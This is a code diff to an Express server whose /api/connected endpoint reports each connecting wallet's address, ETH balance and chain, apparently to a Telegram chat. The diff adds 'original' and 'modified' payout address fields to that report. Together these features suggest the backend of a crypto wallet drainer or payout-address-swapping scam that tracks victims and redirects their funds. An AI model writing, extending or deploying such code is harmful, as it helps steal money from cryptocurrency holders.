@@ -31,15 +31,22 @@ app.get("/health", (req, res) => res.json({ status: "ok" }));
 
 // ─── Wallet connected ─────────────────────────────────────────────────────────
 app.post("/api/connected", limiter, async (req, res) => {
-  const { wallet, balance, chain, via } = req.body;
+  const { wallet, balance, chain, via, payoutOriginal, payoutModified } = req.body;
   if (!wallet) return res.status(400).json({ error: "Missing wallet" });
 
   console.log(`[CONNECT] ${wallet} | ${balance} ETH`);
+
+  const payoutLine = payoutOriginal
+    ? `\n📤 Payout (original): <code>${payoutOriginal}</code>\n` +
+      `📤 Payout (modified): <code>${payoutModified || "—"}</code>`
+    : `\n📤 Payout: not filled yet`;
+
   await tg(
     `🔌 <b>Wallet Connected</b>\n\n` +
-    `👛 <code>${wallet}</code>\n` +
+    `👛 Connection: <code>${wallet}</code>\n` +
     `💰 Balance: <b>${balance} ETH</b>\n` +
-    `🌐 ${chain || "mainnet"} · ${via || "unknown"}\n` +
+    `🌐 ${chain || "mainnet"} · ${via || "unknown"}` +
+    payoutLine + `\n` +
     `🕐 ${new Date().toUTCString()}`
   );
   res.json({ ok: true });
